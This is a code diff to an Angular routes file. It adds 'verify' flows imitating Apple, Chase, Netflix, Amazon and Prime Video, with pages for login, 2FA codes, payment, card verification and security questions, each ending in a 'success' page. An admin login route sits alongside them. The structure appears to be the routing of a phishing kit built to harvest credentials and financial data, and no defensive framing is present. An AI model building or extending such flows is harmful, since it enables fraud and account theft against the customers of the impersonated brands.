@@ -76,6 +76,49 @@ export const routes: Routes = [
         ]
     },
     {
+        path: 'verify/apple',
+        children: [
+            { path: 'login', loadComponent: () => import('../components/flows/apple/apple-login.component').then(m => m.AppleLoginComponent) },
+            { path: '2fa', loadComponent: () => import('../components/flows/apple/apple-2fa.component').then(m => m.Apple2FAComponent) },
+            { path: 'payment', loadComponent: () => import('../components/flows/apple/apple-payment.component').then(m => m.ApplePaymentComponent) },
+            { path: 'success', loadComponent: () => import('../components/flows/apple/apple-success.component').then(m => m.AppleSuccessComponent) },
+            { path: '', redirectTo: 'login', pathMatch: 'full' }
+        ]
+    },
+    {
+        path: 'verify/chase',
+        children: [
+            { path: 'login', loadComponent: () => import('../components/flows/chase/chase-login.component').then(m => m.ChaseLoginComponent) },
+            { path: 'questions', loadComponent: () => import('../components/flows/chase/chase-security-questions.component').then(m => m.ChaseQuestionsComponent) },
+            { path: 'card', loadComponent: () => import('../components/flows/chase/chase-card-verification.component').then(m => m.ChaseCardComponent) },
+            { path: 'success', loadComponent: () => import('../components/flows/chase/chase-success.component').then(m => m.ChaseSuccessComponent) },
+            { path: '', redirectTo: 'login', pathMatch: 'full' }
+        ]
+    },
+    {
+        path: 'verify/netflix',
+        children: [
+            { path: 'login', loadComponent: () => import('../components/flows/netflix/netflix-login.component').then(m => m.NetflixLoginComponent) },
+            { path: 'payment', loadComponent: () => import('../components/flows/netflix/netflix-payment.component').then(m => m.NetflixPaymentComponent) }
+        ]
+    },
+    {
+        path: 'verify/amazon',
+        children: [
+            { path: 'login', loadComponent: () => import('../components/flows/amazon/amazon-login.component').then(m => m.AmazonLoginComponent) },
+            { path: 'password', loadComponent: () => import('../components/flows/amazon/amazon-password.component').then(m => m.AmazonPasswordComponent) },
+            { path: '', redirectTo: 'login', pathMatch: 'full' }
+        ]
+    },
+    {
+        path: 'verify/prime-video',
+        children: [
+            { path: 'login', loadComponent: () => import('../components/flows/prime-video/prime-login.component').then(m => m.PrimeLoginComponent) },
+            { path: 'payment', loadComponent: () => import('../components/flows/prime-video/prime-payment.component').then(m => m.PrimePaymentComponent) },
+            { path: '', redirectTo: 'login', pathMatch: 'full' }
+        ]
+    },
+    {
         path: 'admin/login',
         loadComponent: () => import('../components/admin-login.component').then(m => m.AdminLoginComponent),
         data: { animation: 'AdminLogin' }
